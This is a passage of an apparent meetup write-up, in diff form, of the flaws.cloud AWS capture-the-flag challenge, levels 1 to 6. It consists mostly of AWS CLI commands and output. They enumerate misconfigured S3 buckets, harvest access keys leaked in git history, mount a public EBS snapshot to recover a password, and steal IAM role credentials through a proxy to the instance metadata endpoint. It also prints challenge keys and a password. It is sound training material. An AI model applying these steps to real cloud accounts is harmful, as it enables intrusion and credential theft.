@@ -1,0 +1,788 @@
+.. include:: /pentest_links.txt
+
+.. _flaws_aws:
+
+*****
+flaws
+*****
+
+flaws.cloud AWS challenge
+=========================
+
+
+The challenge
+-------------
+
+This is to document the meetup's efforts responding to the challenge `flaws`_. For other writeups see `mzet-/ctf-writeups - flaws.cloud <https://github.com/mzet-/ctf-writeups/blob/master/flaws.cloud/flaws.cloud.md>`_ (concise and uses ``Scout2``) along with `dboyd13/flaws.cloud.md <https://gist.github.com/dboyd13/ba106b92ad6b795100b766f7c86e532f>`_.
+
+
+The AWS vulnerabilities
+-----------------------
+
+* AWS S3 bucket ACLs allowing AllUsers or AuthenticatedUsers listing bucket contents.
+
+* AWS keys stored in a git repository.
+
+* AWS EC2 snapshot publicly available.
+
+* Proxy server allowing access to AWS EC2 http://169.254.169.254/ metadata.
+
+* Excessive permissions (SecurityAudit).
+
+
+`flaws.cloud Level 1 <http://flaws.cloud>`_
+===========================================
+
+
+Level 1 AWS background
+----------------------
+
+`flaws`_ has followed `AWS S3 - Example: Setting up a Static Website Using a Custom Domain`_ to host a static website using S3. ``whois flaws.com`` shows the registrar is `gandi.net <https://www.gandi.net/>`_ with DNS hosted at Amazon Route 53 (also shown via ``dig +short -t NS flaws.cloud.``). Using Route 53's DNS alias support solves `How to overcome root domain CNAME restrictions? <https://stackoverflow.com/questions/656009/how-to-overcome-root-domain-cname-restrictions>`_.
+
+``dig +short -x $(dig +short flaws.cloud)`` shows that the website is hosted at *s3-website-us-west-2.amazonaws.com.* From `AWS S3 - Website Endpoints`_ this means the AWS S3 bucket flaws.cloud is in AWS region us-west-2 (Oregon), was configured for HTTP access but does not support HTTPS, and only supports publicly readable content via the following S3 bucket policy:
+
+.. code-block:: json
+  :emphasize-lines: 4-8
+
+  {
+    "Version":"2012-10-17",
+    "Statement":[{
+          "Sid":"PublicReadGetObject",
+          "Effect":"Allow",
+            "Principal": "*",
+        "Action":["s3:GetObject"],
+        "Resource":["arn:aws:s3:::flaws.cloud/*"
+        ]
+      }
+    ]
+  }
+
+Note that this only supports s3:GetObject and not the complete list of `AWS IAM - Actions, Resources, and Condition Keys for Amazon S3`_, especially not s3:ListBucket (list bucket contents). But AWS S3 buckets can be misconfigured to allow access from one of the Amazon S3 Predefined Groups in `Amazon S3 - Access Control List (ACL) Overview`_, specifically AllUsers (including anonymous or unauthenticated principals) or AuthenticatedUsers (any user with some AWS account). Note that ACLs are but one way to set permissions: see `IAM Policies and Bucket Policies and ACLs! Oh, My! (Controlling Access to S3 Resources)`_.
+
+AWS uses REST requests (see `Representational state transfer`_). They are authenticated by `Signing AWS API Requests`_ using AWS account access keys consisting of a 20-character access key ID and a 40-character secret access key. (For more detail see `Amazon S3 - Making Requests`_, `AWS S3 - Signing and Authenticating REST Requests`_, `AWS S3 - Authenticating Requests (AWS Signature Version 4)`_, for actual Python code `AWS - Examples of the Complete Version 4 Signing Process (Python)`_.)
+
+To make an unauthenticated (unsigned) request (as AllUsers) use ``aws --no-sign-request ...``. To make an authenticated request (as AuthenticatedUsers) use a temporary AWS account and IAM user not tied to any personal account.
+
+
+Where's the Level 1 website hosted?
+-----------------------------------
+
+One of the first reconnaisance steps is to get an idea where a website is hosted:
+
+.. code-block:: bash
+  :emphasize-lines: 3
+
+  DNS='@8.8.8.8'
+  D=flaws.cloud
+  dig $DNS +short -x $(dig +short $D)
+  # Output: s3-website-us-west-2.amazonaws.com.
+
+So flaws.cloud is hosted on the S3 bucket flaws.cloud in region us-west-2.
+
+
+Anonymous AWS S3 bucket access
+------------------------------
+
+Test for anonymous (AllUsers) s3:ListBucket access to bucket flaws.cloud:
+
+.. code-block:: bash
+  :emphasize-lines: 6-
+
+  DNS='@8.8.8.8'
+  D=flaws.cloud
+  REGION=$(dig $DNS +short -x $(dig $DNS +short $D) \
+    | sed 's/^.*website.//;s/.amazonaws.com\.$//')
+  # --no-sign-request doesn't sign the request (credentials not used)
+  aws --no-sign-request --region $REGION \
+    s3 ls s3://$D/
+  # Output includes: secret-dd02c7c.html
+  aws --no-sign-request --region $REGION \
+    s3 cp s3://$D/secret-dd02c7c.html .
+  cat secret-dd02c7c.html
+  # Output includes: Level 2 is at http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
+
+Permitting s3:ListBucket allows listing the website's bucket content leading to more reconnaissance, and in this simple case the "exploit".
+
+
+`flaws.cloud Level 2 <http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/>`_
+====================================================================================
+
+
+Level 2 AWS background
+----------------------
+
+Use an `AWS Free Tier`_ account for stealth (though not necessary for flaws.cloud). Here's the AWS CLI to add/delete an IAM administrative user:
+
+.. code-block:: bash
+  :emphasize-lines: 5,9,12,18,21,29
+
+  HACKER=hacker
+  HACKERGROUP=Administrators
+  PASSWORD='PleaseChangeMeS00n!'$RANDOM$RANDOM
+
+  # create user
+  aws iam create-user --user-name $HACKER --output json | tee $HACKER-create.json
+  chmod 600 $HACKER-create.json
+
+  # access to the AWS Management Console
+  aws iam create-login-profile --user $HACKER --password $PASSWORD --no-password-reset-required
+
+  # programmatic access
+  aws iam create-access-key --user-name $HACKER --output json | tee $HACKER-keys.json
+  chmod 600 $HACKER-keys.json
+  AK=$(jq -r '.AccessKey.AccessKeyId' $HACKER-keys.json)
+  SAK=$(jq -r '.AccessKey.SecretAccessKey' $HACKER-keys.json)
+
+  # add user to group
+  aws iam add-user-to-group --user-name $HACKER --group-name $HACKERGROUP
+
+  # set up profile
+  cat <<EOF | aws configure --profile $HACKER
+  $AK
+  $SAK
+  $REGION
+  json
+  EOF
+
+  # test profile
+  aws --profile $HACKER iam get-user --output text --query 'User.Arn'
+
+.. _flaws-delete-user:
+
+The corresponding code to delete the user is:
+
+.. code-block:: bash
+  :emphasize-lines: 2,5-
+
+  # *********************
+  # when done delete user
+  # *********************
+  HACKER=hacker
+  aws iam delete-login-profile --user-name $HACKER
+  GS=$(aws iam list-groups-for-user --user-name $HACKER --output text \
+	 --query 'Groups[].GroupName')
+  for G in $GS; do
+    aws iam remove-user-from-group --group-name $G  --user-name $HACKER
+  done
+  KS=$(aws iam list-access-keys --user-name $HACKER --output text \
+	 --query 'AccessKeyMetadata[].AccessKeyId')
+  for K in $KS; do
+    aws iam delete-access-key --user-name $HACKER --access-key-id $K
+  done
+  aws iam delete-user --user-name $HACKER
+
+
+AllUsers bucket access fails
+----------------------------
+
+Accessing the Level 2 bucket *level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud* without signing fails:
+
+.. code-block:: bash
+  :emphasize-lines: 5-
+
+  DNS='@8.8.8.8'
+  D=level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
+  REGION=$(dig $DNS +short -x $(dig $DNS +short $D) \
+    | sed 's/^.*website.//;s/.amazonaws.com\.$//')
+  aws --no-sign-request --region $REGION \
+    s3 ls s3://$D/
+  # Output: An error occurred (AccessDenied) when calling the ListObjects operation: Access Denied
+
+
+AuthenticatedUsers bucket access succeeds
+-----------------------------------------
+
+From `Amazon S3 - Access Control List (ACL) Overview`_ *Amazon S3 Predefined Groups*, permissions are not set using the AllUsers group. But perhaps it uses the AuthenticatedUsers group (any principal with an AWS account). To check out create a throw-away user (following the code above) then:
+
+.. code-block:: bash
+  :emphasize-lines: 7-
+
+  HACKER=hacker
+  DNS='@8.8.8.8'
+  D=level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
+  REGION=$(dig $DNS +short -x $(dig $DNS +short $D | tail -n 1) \
+    | sed 's/^.*website.//;s/.amazonaws.com\.$//')
+
+  aws --profile $HACKER --region $REGION s3 ls s3://$D/
+  # Output includes: secret-e4443fc.html
+  aws --profile $HACKER --region $REGION s3 cp s3://$D/secret-e4443fc.html .
+  cat secret-e4443fc.html
+  # Output includes: Level 3 is at http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud
+
+Level 2 is just Level 1 using an AuthenticatedUser (with s3:ListBucket and s3:GetObject action permissions).
+
+
+`flaws.cloud Level 3 <http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/>`_
+====================================================================================
+
+
+Level 3 AWS background
+----------------------
+
+
+AWS reconnaissance
+^^^^^^^^^^^^^^^^^^
+
+Use `AWS Security Audit Guidelines`_ to assess recently compromised credentials. `AWS Security - Staying on Top of the Cloud <https://www.owasp.org/images/c/cc/AWS_Security_-_Staying_on_Top_of_the_Cloud.pdf>`_ mentions these tools:
+
+* `Truffle Hog <https://github.com/dxa4481/truffleHog>`_
+
+  Searches through git repositories for secrets, digging deep into commit history and branches. This is effective at finding secrets accidentally committed.
+
+* `AWS-recipes <https://github.com/nccgroup/AWS-recipes>`_
+
+  Not useful in this context, but useful for study of policy content.
+
+* `AWS Scout2 <https://github.com/nccgroup/Scout2>`_
+
+  Scout2 is a security tool that lets AWS administrators assess their environment's security posture. It produces an html report.  Needed permissions are AWS Managed Policies ReadOnlyAccess and SecurityAudit, though interesting results are possible without those permissions. See `AWS Scout2 Wiki <https://github.com/nccgroup/Scout2/wiki>`_ for more information.
+
+
+AWS STS
+^^^^^^^
+
+Amazon STS (Security Token Service) allows creation of `AWS IAM - Temporary Security Credentials`_. For this level the only `AWS CLI - sts`_ command used is `AWS CLI - sts get-caller-identity`_.
+
+.. code-block:: bash
+  :emphasize-lines: 1,3
+
+  # iam call errors out
+  aws iam get-user
+  # Alternative is to use sts to get account:
+  aws sts get-caller-identity --output text --query 'Account'
+
+
+AllUsers bucket access
+----------------------
+
+Access the level 3 bucket as AllUsers:
+
+.. code-block:: bash
+  :emphasize-lines: 8-9,13
+
+  LEVEL3=level3
+  DNS='@8.8.8.8'
+  D=level3-9afd3927f195e10225021a578e6f78df.flaws.cloud
+  REGION=$(dig $DNS +short -x $(dig $DNS +short $D) \
+    | sed 's/^.*website.//;s/.amazonaws.com\.$//')
+
+  # List the bucket
+  aws --no-sign-request --region $REGION s3 ls s3://$D/
+  # Output includes: PRE .git/
+
+  # Get the git repo
+  mkdir -p $LEVEL3-repo/.git
+  aws --no-sign-request --region $REGION s3 sync s3://$D/.git $LEVEL3-repo/.git
+
+
+Analyze the git repo
+--------------------
+
+Git repositories have been a historical source of leaked credentials:
+
+.. code-block:: bash
+  :emphasize-lines: 3-5,6-12,18,23,26-27,29-
+
+  LEVEL3=level3
+  cd $LEVEL3-repo
+  git log
+  # Output includes: Oops, accidentally added something I shouldn't have
+  # Output includes: commit f52ec03b227ea6094b04e43f475fb0126edb5a61
+
+  git checkout f52ec03b227ea6094b04e43f475fb0126edb5a61
+  ls
+  # Output: access_keys.txt
+  cat access_keys.txt
+  # Output includes: access_key AKIAJ366LIPB4IJKT7SA
+  # Output includes: secret_access_key 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
+  AK=$(sed -n '/^access_key / {s/^access_key //;p}' access_keys.txt)
+  SAK=$(sed -n '/^secret_access_key / {s/^secret_access_key //;p}' access_keys.txt)
+  cd -
+
+  # create profile using the leaked keys
+  cat <<EOF | aws configure --profile $LEVEL3
+  $AK
+  $SAK
+  $REGION
+  json
+  EOF
+
+  # Test keys
+  aws --profile $LEVEL3 s3 ls
+  # Output includes: level4-1156739cfb264ced6de514971a4bef68.flaws.cloud
+
+  # What about the user?
+  aws --profile $LEVEL3 iam get-user --output text
+  # Output includes: User: arn:aws:iam::975426262029:user/backup
+  aws --profile $LEVEL3 --region $REGION sts get-caller-identity
+  # Output includes: "UserId": "AIDAJQ3H5DC3LEG2BKSLC"
+  # Output includes: "Account": "975426262029"
+  # Output includes: "Arn": "arn:aws:iam::975426262029:user/backup"
+
+Use Truffle Hog for an alternative approach to finding the Git credentials:
+
+.. code-block:: bash
+  :emphasize-lines: 4,19,21
+
+  LEVEL3=level3
+
+  pip install -U truffleHog
+  trufflehog --regex --entropy=False $LEVEL3-repo
+  # ~~~~~~~~~~~~~~~~~~~~~
+  # Reason: AWS API Key
+  # Date: 2017-09-17 15:10:43
+  # Hash: f52ec03b227ea6094b04e43f475fb0126edb5a61
+  # Filepath: access_keys.txt
+  # Branch: origin/master
+  # Commit: Oops, accidentally added something I shouldn't have
+
+  # AKIAJ366LIPB4IJKT7SA
+  # ~~~~~~~~~~~~~~~~~~~~~
+  # ~~~~~~~~~~~~~~~~~~~~~
+  # Reason: AWS API Key
+  # Date: 2017-09-17 15:10:07
+  # Hash: f52ec03b227ea6094b04e43f475fb0126edb5a61
+  # Filepath: access_keys.txt
+  # Branch: origin/master
+  # Commit: first commit
+
+  # AKIAJ366LIPB4IJKT7SA
+  # ~~~~~~~~~~~~~~~~~~~~~
+
+This identifies the commit/file candidates for AWS credentials allowing the exploit to continue as shown above.
+
+
+Audit the compromised keys
+--------------------------
+
+The goal is to collect information from `AWS Security Audit Guidelines`_ with user *backup*. Here use ``Scout2``:
+
+.. code-block:: bash
+  :emphasize-lines: 8,10-11,14-16,22-24,25,27,30
+
+  LEVEL3=level3
+  DNS='@8.8.8.8'
+  D=level3-9afd3927f195e10225021a578e6f78df.flaws.cloud
+  REGION=$(dig $DNS +short -x $(dig $DNS +short $D) \
+    | sed 's/^.*website.//;s/.amazonaws.com\.$//')
+
+  pip install -U awsscout2
+  Scout2 --profile $LEVEL3 --region $REGION --report-dir scout2-$LEVEL3
+  # Directory scout2-$LEVEL3 contains HTML report:
+  (cd scout2-$LEVEL3; python3 -m http.server 8080)
+  # Browse report ...
+
+  # For detailed information:
+  tail scout2-$LEVEL3/inc-awsconfig/aws_config-$LEVEL3.js -n +2 \
+    | jq '.' \
+    | tee $LEVEL3-scout2.json
+  # From this list of services:
+  #   cloudformation cloudtrail cloudwatch directconnect
+  #   ec2 efs elasticache elb elbv2 emr iam awslambda
+  #   redshift rds route53 route53domains s3 ses sns sqs vpc
+  # only ec2 and vpc show interesting results:
+  for SERVICE in ec2 vpc; do
+    jq '.services.'$SERVICE'.regions["'$REGION'"]' $LEVEL3-scout2.json | tee $LEVEL3-service-$SERVICE.json
+  done
+  # NOTE: Scout2 shows no buckets
+  jq '.services.s3.buckets_count' $LEVEL3-scout2.json  # 0 buckets
+  # But there are indeed buckets listed here
+  aws --profile $LEVEL3 s3 ls
+
+  # A summary of  ec2
+  jq '.services.ec2.regions["'$REGION'"].snapshots' $LEVEL3-scout2.json
+  # Note - createVolumPermission.Group = all, meaning anyone can use snapshot
+  jq '.services.ec2.regions["'$REGION'"].volumes' $LEVEL3-scout2.json
+  jq '.services.ec2.regions["'$REGION'"].vpcs | keys[] as $k | .[$k].instances' $LEVEL3-scout2.json
+  # jq '.services.ec2.regions["'$REGION'"].vpcs."vpc-1052ce77".instances' $LEVEL3-scout2.json
+  jq '.services.ec2.regions["'$REGION'"].vpcs | keys[] as $k | .[$k].network_interfaces' $LEVEL3-scout2.json
+  jq '.services.ec2.regions["'$REGION'"].vpcs | keys[] as $k | .[$k].security_groups' $LEVEL3-scout2.json
+
+This reconnaisance will be used in Level 4. Note the ``Scout2`` output is quite useful despite the limited *backup* user permissions.
+
+
+`flaws.cloud Level 4 <http://level4-1156739cfb264ced6de514971a4bef68.flaws.cloud>`_
+===================================================================================
+
+
+Level 4 AWS background
+----------------------
+
+For an introduction to snapshots see `AWS EC2 - Amazon EBS Snapshots`_ and for sharing snapshots see `AWS EC2 - Sharing an Amazon EBS Snapshot`_. A public snapshot gives access to server data which can be used in an exploit.
+
+
+Verify Level 4 is an EC2 instance
+---------------------------------
+
+Our goal is "to get access to the web page running on an EC2 at 4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud" which is protected by a Username/Password. First verify it's an EC2 instance as claimed:
+
+.. code-block:: bash
+  :emphasize-lines: 5-6
+  
+  DNS='@8.8.8.8'
+  D=4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud
+
+  # verify web server running on EC2
+  dig $DNS +short $D
+  # Output: ec2-35-165-182-7.us-west-2.compute.amazonaws.com.
+  # Output: 35.165.182.7
+  REGION=$(dig $DNS +short $D | head -n1 | cut -d. -f2)
+
+
+Exploit public snapshot
+-----------------------
+
+Level 3 left us with *backup*'s credentials and reconnaisance results from ``Scout2``. Prominent among those results is there is 1 EC2 instance with 1 snapshot of it's disk volume. One way to exploit the snapshot is: restore the snapshot to a volume, mount the volume on an EC2 instance, then explore the volume for exploit potentials. Level 3 credentials are required to recon that snapshot, your hacker account creates the EC2 instance using the public snapshot.
+
+.. code-block:: bash
+  :emphasize-lines: 11-13,31-35,37-38,47,54,63,73,80,88,92,95-
+
+  LEVEL3=level3
+  LEVEL4=level4
+  HACKER=hacker
+  DNS='@8.8.8.8'
+  D=4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud
+  REGION=$(dig $DNS +short $D | head -n1 | cut -d. -f2)
+  ACCOUNT=$(aws --profile $LEVEL3 --region $REGION \
+      sts get-caller-identity --output text --query 'Account')
+  TYPE=t2.nano
+
+  # There are multiple ways to get the snapshot id:
+  #   Get it from the level3 reconnaisance dump:
+  SNAP=$(jq -r '.services.ec2.regions["'$REGION'"].snapshots | keys[0]' $LEVEL3-scout2.json)
+  #   Get snapshots restorable by backup user
+  aws --profile $LEVEL3 --region $REGION \
+    ec2 describe-snapshots --restorable-by-user-ids $ACCOUNT \
+      --query 'Snapshots[0].SnapshotId' --output text
+  #   Get snapshots owned by backup user
+  aws --profile $HACKER --region $REGION \
+    ec2 describe-snapshots --owner-ids $ACCOUNT \
+      --query 'Snapshots[0].SnapshotId' --output text
+  #   Get instance volume snapshots
+  VOL=$(aws --profile $LEVEL3 --region $REGION \
+    ec2 describe-instances --output text \
+      --query 'Reservations[0].Instances[0].BlockDeviceMappings[0].Ebs.VolumeId' \
+  )
+  aws --profile $LEVEL3 --region $REGION \
+    ec2 describe-snapshots --filter "Name=volume-id,Values=$VOL" \
+      --query 'Snapshots[0].SnapshotId' --output text
+
+  # NOTE: other writeups mentioned the availability zone (AZ). You should know:
+  #   Different accounts using the same AZ id may refer to a different actual AZ.
+  #   Said another way, us-west-2a for your account may be a different AZ for my account.
+  #   There is no way to force a resource into the same AZ as another account.
+  # The good news is that restoring a snapshot only requires it be in the same region.
+
+  # Start instance with snapshot attached:
+  #   Security group allows inbound SSH
+  SG=$LEVEL4-sg
+  SGID=$(aws --profile $HACKER --region $REGION \
+      ec2 create-security-group --group-name $SG \
+          --description 'SSH to instance' --output text \
+  )
+  aws --profile $HACKER --region $REGION \
+    ec2 authorize-security-group-ingress --group-name $SG \
+    --protocol tcp --port 22 --cidr 0.0.0.0/0
+  #   SSH keys
+  KEYNAME=$LEVEL4-key
+  aws --profile $HACKER --region $REGION \
+    ec2 create-key-pair --key-name $KEYNAME \
+      --query 'KeyMaterial' --output text \
+    | tee $KEYNAME.pem
+  chmod 600 $KEYNAME.pem
+  # Get region's Ubuntu AMI
+  AMI=$(aws --profile $HACKER --region "$REGION" \
+          ec2 describe-images --owners 099720109477 \
+            --filters Name=root-device-type,Values=ebs \
+                      Name=architecture,Values=x86_64 \
+                      Name=name,Values='*hvm-ssd/ubuntu-bionic-18.04*' \
+            --query 'Images[].[CreationDate,ImageId,Name]' --output text \
+        | sort -k1 | tail -n1 | gawk '{print $2}' \
+  )
+  # Fire up the VM
+  VMNAME=$LEVEL4
+  INSTANCE=$(aws --profile $HACKER --region $REGION \
+    ec2 run-instances --image-id "$AMI" --count 1 \
+      --instance-type "$TYPE" --key-name "$KEYNAME" --security-group-ids "$SGID" \
+      --block-device-mappings "DeviceName=/dev/xvdf,Ebs={DeleteOnTermination=true,SnapshotId=$SNAP}" \
+      --tag-specifications 'ResourceType=instance,Tags=[{Key=Name,Value='$VMNAME'}]' \
+      --query 'Instances[0].InstanceId' --output text \
+  )
+
+  # Another way to get the instance ID
+  INSTANCE=$(aws --profile $HACKER --region $REGION ec2 describe-instances \
+                  --filters "Name=tag:Name,Values=$VMNAME" \
+                  --query 'Reservations[*].Instances[*].InstanceId' \
+                  --output text \
+  )
+
+  # Get the public DNS name
+  PUBDNS=$(aws --profile $HACKER --region $REGION \
+             ec2 describe-instances \
+               --filters "Name=tag:Name,Values=$VMNAME" \
+               --query 'Reservations[*].Instances[*].PublicDnsName' \
+               --output text \
+  )
+
+  # Wait for instance running
+  aws --profile $HACKER --region $REGION \
+    ec2 wait instance-running --instance-ids "$INSTANCE"
+
+  # Use the VM
+  ssh -i "$KEYNAME.pem" ubuntu@$PUBDNS
+
+  sudo mount /dev/xvdf1 /mnt
+  # After a bit of reconnaissance:
+  cat /mnt/home/ubuntu/setupNginx.sh
+  # Output: htpasswd -b /etc/nginx/.htpasswd flaws nCP8xigdjpjyiXgJ7nJu7rw5Ro68iE8M
+  sudo shutdown -h now
+
+On the website http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/ enter Username flaws and Password nCP8xigdjpjyiXgJ7nJu7rw5Ro68iE8M getting the output:
+
+  Good work getting in. This level is described at http://level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud/243f422c/
+
+.. _flaws-delete-instance:
+
+To clean up the created EC2 resources:
+
+.. code-block:: bash
+  :emphasize-lines: 9-
+
+  DNS='@8.8.8.8'
+  D=4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud
+  REGION=$(dig $DNS +short $D | head -n1 | cut -d. -f2)
+  HACKER=hacker
+  LEVEL4=level4
+  SG=$LEVEL4-sg
+  KEYNAME=$LEVEL4-key
+  VMNAME=$LEVEL4
+  INSTANCE=$(aws --profile $HACKER --region $REGION ec2 describe-instances \
+                 --filters "Name=tag:Name,Values=$VMNAME" \
+                 --query 'Reservations[*].Instances[*].InstanceId' \
+                 --output text \
+  )
+  aws --profile $HACKER --region $REGION \
+    ec2 terminate-instances --instance-ids $INSTANCE
+  aws --profile $HACKER --region $REGION \
+    ec2 delete-key-pair --key-name $KEYNAME
+  rm $KEYNAME.pem
+  aws --profile $HACKER --region $REGION \
+    ec2 delete-security-group --group-name $SG
+
+
+`flaws.cloud Level 5 <http://level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud/243f422c/>`_
+=============================================================================================
+
+
+Level 5 AWS background
+----------------------
+
+This exploit hinges on using `AWS EC2 - Instance Metadata and User Data`_. Specifically, if a host allows access to http://169.254.169.254 then critical security information can be leaked. For retrieving and using credentials see `AWS EC2 - Retrieving Security Credentials from Instance Metadata`_, `AWS IAM - Using Temporary Security Credentials with the AWS CLI`_, and `AWS CLI - Configuring the AWS CLI`_. Here's an example:
+
+.. code-block:: bash
+  :emphasize-lines: 3-4,9,17,28
+
+  # Get the creds
+  ROLE=some-role
+  curl --silent http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE/ \
+    | tee creds.json
+  AK=$(jq -r '.AccessKeyId' creds.json)
+  SAK=$(jq -r '.SecretAccessKey' creds.json)
+  TOKEN=$(jq -r '.Token' creds.json)
+
+  # Use the creds
+  (
+  export AWS_ACCESS_KEY_ID="$AK"
+  export AWS_SECRET_ACCESS_KEY="$SAK"
+  export AWS_SESSION_TOKEN="$TOKEN"
+  aws --region us-west-2 ec2 describe-instances
+  )
+
+  # Create a profile
+  HACKER=myprofile
+  REGION=us-west-2
+  cat <<EOF | aws configure --profile $HACKER
+  $AK
+  $SAK
+  $REGION
+  json
+  EOF
+  aws --profile $HACKER configure set aws_session_token "$TOKEN"
+
+  # Use the profile
+  aws --profile $HACKER --region $REGION ec2 describe-instances
+
+
+Exploit the proxy to get meta-data
+----------------------------------
+
+The proxy not restricting IPs allows fetching instance metadata, leading to a credentials leak, resulting in the goal of listing the contents of the level 6 bucket.
+
+.. code-block:: bash
+  :emphasize-lines: 6,14,26-28,30-
+
+  LEVEL5=level5
+  DNS='@8.8.8.8'
+  D=4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud
+  REGION=$(dig $DNS +short $D | head -n1 | cut -d. -f2)
+
+  # Get the role, then credentials
+  PROXY=$D/proxy
+  ROLE=$(curl --silent http://$PROXY/169.254.169.254/latest/meta-data/iam/security-credentials/ \
+    head -n1 \
+  )
+  curl --silent http://$PROXY/169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE \
+    | tee $LEVEL5-creds.json
+
+  # Create a profile
+  AK=$(jq -r '.AccessKeyId' $LEVEL5-creds.json)
+  SAK=$(jq -r '.SecretAccessKey' $LEVEL5-creds.json)
+  TOKEN=$(jq -r '.Token' $LEVEL5-creds.json)
+  cat <<EOF | aws configure --profile $LEVEL5
+  $AK
+  $SAK
+  $REGION
+  json
+  EOF
+  aws --profile $LEVEL5 configure set aws_session_token "$TOKEN"    
+  
+  # Test out the profile against the level 6 bucket
+  aws --profile $LEVEL5 s3 ls --recursive s3://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud
+  # Output includes: ddcc78ff/
+
+  # Visit the ddcc78ff directory
+  curl http://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff/
+  # Output includes: you're getting a user access key that has the SecurityAudit policy attached to it.
+  # Output includes: Access key ID: AKIAJFQ6E7BY57Q3OBGA
+  # Output includes: Secret: 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
+
+We'll delay reconnaissance of the newly exposed credentials to the next level. Note they are token-based (created by AWS STS) and are therefore time-limited.
+
+
+`flaws.cloud Level 6 <http://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff/>`_
+=============================================================================================
+
+
+Level 6 AWS background
+----------------------
+
+
+SecurityAudit policy
+^^^^^^^^^^^^^^^^^^^^
+
+From `AWS IAM - AWS Managed Policies for Job Functions`_ the `AWS IAM - Security Auditor`_ "grants permissions to view configuration data for many AWS services and to review their logs" - perfect for reconnaisance. The permissions associated with SecurityAudit are not documented but are available at `gene1wood/all_aws_managed_policies.json - SecurityAudit <https://gist.github.com/gene1wood/55b358748be3c314f956#file-all_aws_managed_policies-json-L5664>`_.
+
+
+API Gateway and Lambda functions
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+This exploit will require basic understanding of Lambda functions and more importantly the API Gateway. For a high level overview see:
+
+* `AWS BUILD YOUR FIRST Serverless Web Application`_ - focus on the diagram showing the Amazon API Gateway and AWS Lambda.
+
+* `AWS API GW - What Is Amazon API Gateway?`_ - again, focus on the diagram showing the API Gateway architecture.
+
+* `AWS API GW - Amazon API Gateway Concepts`_ - understand the terms API Gateway, API deployment (introduces API stages), API endpoints, API stage, Method request/response vs Integration request/response + Mapping template (converting method request to integration request, or integration response to method response).
+
+* From `AWS API GW - Amazon API Gateway REST API`_, `AWS API GW - Making HTTP Requests to Amazon API Gateway`_ is essential and the concepts behind `AWS API GW - Signing Requests`_ are useful in other contexts.
+
+* `AWS Lambda - Using AWS Lambda with Amazon API Gateway (On-Demand Over HTTPS)`_ leads to `AWS Lambda - Using AWS Lambda with Amazon API Gateway (On-Demand Over HTTPS) Example`_ which has the very important `AWS Lambda - Step 3: Create an API Using Amazon API Gateway and Test It`_ which details how the API Gateway is constructed. This is required knowledge for the flaws.cloud exploit.
+
+* Non-AWS API Gateway examples are `How to build a Serverless API with Go and AWS Lambda <https://www.alexedwards.net/blog/serverless-api-with-go-and-aws-lambda>`_ (you can ignore the golang parts) and `Microservice using AWS API Gateway, AWS Lambda and Couchbase <https://blog.couchbase.com/microservice-aws-api-gateway-lambda-couchbase/>`_ (you can ignore the Couchbase functions).
+
+To clarify method response vs integration response see `AWS API GW - Creating an API in Amazon API Gateway`_:
+
+  Expressed in the request parameters and body, a Method defines the application programming interface for the client to access the exposed Resource and represents an incoming request submitted by the client. You then create an `Integration <https://docs.aws.amazon.com/apigateway/api-reference/resource/integration/>`_ resource to integrate the Method with a backend endpoint, also known as the integration endpoint, by forwarding the incoming request to a specified integration endpoint URI. If necessary, you transform request parameters or body to meet the backend requirements. For responses, you can create a `MethodResponse <https://docs.aws.amazon.com/apigateway/api-reference/resource/method-response/>`_ resource to represent a request response received by the client and you create an `IntegrationResponse <https://docs.aws.amazon.com/apigateway/api-reference/resource/integration-response/>`_ resource to represent the request response that is returned by the backend. You can configure the integration response to transform the backend response data before returning the data to the client or to pass the backend response as-is to the client.
+
+
+Exploit SecurityAudit policy
+----------------------------
+
+Level 6 provides *Access key ID: AKIAJFQ6E7BY57Q3OBGA* and *Secret: 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* with the SecurityAudit policy.
+
+.. code-block:: bash
+  :emphasize-lines: 8,18-21,23,31,35,42,46,52,54,57,60,62-64,72-
+
+
+  LEVEL6=level6
+  DNS='@8.8.8.8'
+  D=level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud
+  REGION=$(dig $DNS +short -x $(dig $DNS +short $D) \
+    | sed 's/^.*website.//;s/.amazonaws.com\.$//')
+  URL=$D/ddcc78ff
+
+  # Create level6 profile
+  AK=$(curl --silent http://$URL/ | grep 'Access key ID:' | sed 's/^.*Access key ID: //;s/<.*$//')
+  SAK=$(curl --silent http://$URL/ | grep 'Secret:' | sed 's/^.*Secret: //;s/<.*$//')
+  cat <<EOF | aws configure --profile $LEVEL6
+  $AK
+  $SAK
+  $REGION
+  json
+  EOF
+ 
+  # Scout2 for reconnaissance
+  Scout2 --profile $LEVEL6 --region $REGION --report-dir scout2-$LEVEL6
+  (cd scout2-$LEVEL6; python3 -m http.server 8080)
+  # Browse report ...
+
+  # For detailed information:
+  tail scout2-$LEVEL6/inc-awsconfig/aws_config-$LEVEL6.js -n +2 \
+    | jq '.' \
+    | tee $LEVEL6-scout2.json
+  # From this list of services:
+  #   cloudformation cloudtrail cloudwatch directconnect
+  #   ec2 efs elasticache elb elbv2 emr iam awslambda
+  #   redshift rds route53 route53domains s3 ses sns sqs vpc
+  # Numerous services show interesting results:
+  for SERVICE in awslambda cloudtrail ec2 elbv2 rds vpc; do
+    jq '.services.'$SERVICE'.regions["'$REGION'"]' $LEVEL6-scout2.json | tee $LEVEL6-service-$SERVICE.json
+  done
+  # IAM is not region-based
